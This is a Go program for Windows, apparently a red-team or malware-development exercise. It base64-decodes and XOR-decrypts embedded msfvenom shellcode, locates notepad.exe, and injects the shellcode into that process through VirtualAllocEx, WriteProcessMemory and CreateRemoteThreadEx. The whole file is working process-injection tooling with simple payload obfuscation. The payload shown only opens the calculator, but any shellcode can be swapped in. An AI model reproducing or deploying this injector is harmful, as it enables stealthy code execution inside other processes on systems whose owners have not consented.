package main

import (
	_ "embed"
	b64 "encoding/base64"
	"errors"
	"fmt"
	"log"
	"os"
	"strings"
	"syscall"
	"unsafe"

	win32 "golang.org/x/sys/windows"
)

// msfvenom -p windows/x64/exec CMD='cmd.exe /c calc.exe' -f raw
// XOR Encrypted with '42'
//
//go:embed shellcode/sc.xor.42.b64
var enc_sc_b64 string

var (
	kernel32             = win32.NewLazySystemDLL("kernel32.dll")
	VirtualAllocEx       = kernel32.NewProc("VirtualAllocEx")
	WriteProcessMemory   = kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx = kernel32.NewProc("CreateRemoteThreadEx")
)

type WindowsProcess struct {
	ProcessID       int
	ParentProcessID int
	Exe             string
}

func checkError(err error) {
	if err != nil {
		log.Fatalln("[!] ERR: ", err)
	}
}

// https://kylewbanks.com/blog/xor-encryption-using-go
// xor runs a XOR encryption on the input string, encrypting it if it hasn't already been,
// and decrypting it if it has, using the key provided.
func xor(input, key string) (output []byte) {
	for i := 0; i < len(input); i++ {
		output = append(output, input[i]^key[i%len(key)])
	}

	return output
}

func decrypt_xor_shellcode(key string, encrypted_sc_b64 string) (output []byte) {
	//Decode from b64 string
	enc_sc, _ := b64.StdEncoding.DecodeString(encrypted_sc_b64)
	//XOR with key
	output = xor(string(enc_sc), key)

	return output

}

func newWindowsProcess(e *win32.ProcessEntry32) WindowsProcess {
	// Find when the string ends for decoding
	end := 0
	for {
		if e.ExeFile[end] == 0 {
			break
		}
		end++
	}

	return WindowsProcess{
		ProcessID:       int(e.ProcessID),
		ParentProcessID: int(e.ParentProcessID),
		Exe:             syscall.UTF16ToString(e.ExeFile[:end]),
	}
}

func processes(procname string) ([]WindowsProcess, error) {

	var TH32CS_SNAPPROCESS uint32 = 0x00000002
	var pe32 win32.ProcessEntry32

	//Get handle to snapshot of Windows Process List
	hProcSnap, err := win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

	checkError(err)

	//Defer the handle close
	defer win32.CloseHandle(hProcSnap)

	pe32.Size = uint32(unsafe.Sizeof(pe32))

	// Get the first process
	if err := win32.Process32First(hProcSnap, &pe32); err != nil {
		return nil, err
	}

	results := make([]WindowsProcess, 0, 50)

	for {
		results = append(results, newWindowsProcess(&pe32))

		err := win32.Process32Next(hProcSnap, &pe32)

		if err != nil {
			// windows sends ERROR_NO_MORE_FILES on last process
			if err == syscall.ERROR_NO_MORE_FILES {
				return results, nil
			}

			return nil, err
		}
	}

}

func FindTarget(procname string) (pid uint32, err error) {
	procs, err := processes(procname)

	checkError(err)

	for _, p := range procs {
		if strings.ToLower(p.Exe) == strings.ToLower(procname) {
			return uint32(p.ProcessID), nil
		}
	}
	
	return 0, errors.New("[!] ERR: " +  procname + " not found!")

}

func Inject(pid uint32, sc []byte) {

	sc_len := uintptr(len(sc))

	// Try to open the target process
	hProc, err := win32.OpenProcess(
		win32.PROCESS_CREATE_THREAD|
			win32.PROCESS_QUERY_INFORMATION|
			win32.PROCESS_VM_OPERATION|
			win32.PROCESS_VM_READ|
			win32.PROCESS_VM_WRITE,
		false,
		pid,
	)

	checkError(err)

	baseAddress, _, errVirtualAllocEx := VirtualAllocEx.Call(uintptr(hProc), 0, sc_len, win32.MEM_COMMIT, syscall.PAGE_EXECUTE_READ)

	errWriteProcessMemory := win32.WriteProcessMemory(hProc, baseAddress, &sc[0], sc_len, nil)

	checkError(errWriteProcessMemory)

	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(hProc), 0, 0, baseAddress, 0, 0, 0)

	if errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!] ERR: calling CreateRemoteThread:\r\n%s", errVirtualAllocEx.Error()))
	}

	win32.CloseHandle(hProc)

}

func main() {
	// objectives:
	// [x] embed encrypted shellcode from file into program
	// [x] decrypt shellcode (XOR)
	// [x] inject shellcode into notepad.exe

	key := "42"
	targetProc := "notepad.exe"
	sc := decrypt_xor_shellcode(key, enc_sc_b64)

	//Get PID of target process
	pid, err := FindTarget(targetProc)

	// Process is not found or other error
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	// Inject with
	// - VirtualAllocEx
	// - WriteProcessMemory
	// - CreateRemoteThreadEx
	Inject(pid, sc)

}
